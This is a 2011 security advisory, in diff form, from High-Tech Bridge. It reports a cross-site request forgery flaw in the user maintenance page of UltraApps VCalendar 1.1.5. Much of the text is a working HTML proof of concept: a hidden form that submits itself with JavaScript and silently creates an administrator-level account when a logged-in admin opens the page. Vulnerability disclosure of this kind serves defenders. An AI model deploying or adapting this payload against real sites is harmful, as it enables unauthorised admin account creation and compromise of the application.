@@ -1,0 +1,32 @@
+Vulnerability ID: HTB22969
+Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_vcalendar.html
+Product: VCalendar
+Vendor: UltraApps ( http://ultraapps.com ) 
+Vulnerable Version: 1.1.5
+Vendor Notification: 21 April 2011 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/admin/users_maint.php" script to properly verify the source of HTTP request.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action="http://[host]/admin/users_maint.php?ccsForm=users_maint" method="post" name="main" />
+<input type="hidden" name="user_login" value="test"/>
+<input type="hidden" name="user_password" value="test"/>
+<input type="hidden" name="user_level" value="100"/>
+<input type="hidden" name="user_email" value="test@test.com"/>
+<input type="hidden" name="user_first_name" value="test"/>
+<input type="hidden" name="user_last_name" value="test"/>
+<input type="hidden" name="user_is_approved" value="1"/>
+<input type="hidden" name="user_date_add_h" value="04.16.2011"/>
+<input type="submit" id="btn" name="submit" value="Submit ››">
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+
